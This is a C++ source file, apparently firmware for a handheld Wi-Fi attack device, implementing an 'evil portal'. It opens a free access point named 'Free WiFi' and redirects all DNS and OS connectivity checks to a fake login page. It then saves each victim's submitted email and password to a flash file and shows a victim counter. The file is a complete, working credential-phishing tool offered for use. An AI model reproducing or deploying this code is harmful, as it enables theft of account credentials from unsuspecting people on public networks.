// pid PID::EVIL_PORTAL

#include <LittleFS.h>

const char* EVIL_PORTAL_SSID = "Free WiFi";
const char* EVIL_PORTAL_CREDS_FILE = "/evil_portal_creds.txt";
IPAddress EVIL_PORTAL_GATEWAY(172, 0, 0, 1);
IPAddress EVIL_PORTAL_SUBNET(255, 255, 255, 0);
int evilPortalVictimCount = 0;

void evilPortalSaveCreds(String email, String password) {
	if (!lfsBegin()) return;

	File f = LittleFS.open(EVIL_PORTAL_CREDS_FILE, FILE_APPEND);
	if (!f) {
		// try create new
		f = LittleFS.open(EVIL_PORTAL_CREDS_FILE, FILE_WRITE);
		if (!f) return;
	}

	DeviceTime dt = deviceGetTime();
	char timeBuf[16];
	snprintf(timeBuf, sizeof(timeBuf), "%02d:%02d:%02d", dt.hours, dt.minutes, dt.seconds);

	String entry = String(timeBuf) + " | " + email + " | " + password + "\n";
	f.print(entry);
	f.close();

	evilPortalVictimCount++;
	soundSuccess();

	Serial.println("Evil Portal: captured " + email);
}

void evilPortalSetup() {
	WiFi.mode(WIFI_AP);
	WiFi.softAP(EVIL_PORTAL_SSID, nullptr); // open network
	WiFi.softAPConfig(EVIL_PORTAL_GATEWAY, EVIL_PORTAL_GATEWAY, EVIL_PORTAL_SUBNET);

	// DNS server — redirect ALL domains to captive portal
	dnsServer.start(53, "*", EVIL_PORTAL_GATEWAY);

	// Captive portal detection endpoints (various OS)
	webServer.on("/generate_204", []() {
		webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/hotspot-detect.html", []() {
		webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/library/test/success.html", []() {
		webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/success.txt", []() {
		webServer.send(200, "text/plain", "success");
	});
	webServer.on("/ncsi.txt", []() {
		webServer.send(200, "text/plain", "Microsoft NCSI");
	});
	webServer.on("/connecttest.txt", []() {
		webServer.send(200, "text/plain", "Microsoft Connect Test");
	});
	webServer.on("/redirect", []() {
		webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/canonical.html", []() {
		webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});

	// Main portal page
	webServer.on("/", []() {
		webServer.send(200, "text/html", evilPortalHTML());
	});

	// Login handler
	webServer.on("/login", []() {
		if (webServer.method() == HTTP_POST) {
			String email = webServer.arg("email");
			String password = webServer.arg("password");
			if (email.length() > 0 && password.length() > 0) {
				evilPortalSaveCreds(email, password);
			}
			webServer.send(200, "text/html", evilPortalSuccessHTML());
		} else {
			webServer.sendHeader("Location", "/", true);
			webServer.send(302, "text/plain", "");
		}
	});

	// Catch-all — redirect to portal
	webServer.onNotFound([]() {
		webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});

	webServer.begin();
}

void evilPortalLoop() {
	if (isSetup()) {
		evilPortalSetup();
		isWebInterfaceEnabled = true;
		evilPortalVictimCount = 0;

		String lines[] = {
			L->TXT_WIFI_EVIL_PORTAL_RUNNING,
			"SSID: " + String(EVIL_PORTAL_SSID),
			"Victims: " + String(evilPortalVictimCount),
			String(EVIL_PORTAL_CREDS_FILE)
		};
		centeredPrintRows(lines, 4, SMALL_TEXT);
	}

	dnsServer.processNextRequest();
	webServer.handleClient();

	// Update victim counter on screen
	static int lastVictimCount = 0;
	if (evilPortalVictimCount != lastVictimCount) {
		lastVictimCount = evilPortalVictimCount;
		String lines[] = {
			L->TXT_WIFI_EVIL_PORTAL_RUNNING,
			"SSID: " + String(EVIL_PORTAL_SSID),
			"Victims: " + String(evilPortalVictimCount),
			String(EVIL_PORTAL_CREDS_FILE)
		};
		centeredPrintRows(lines, 4, SMALL_TEXT);
	}

	checkExit();
}
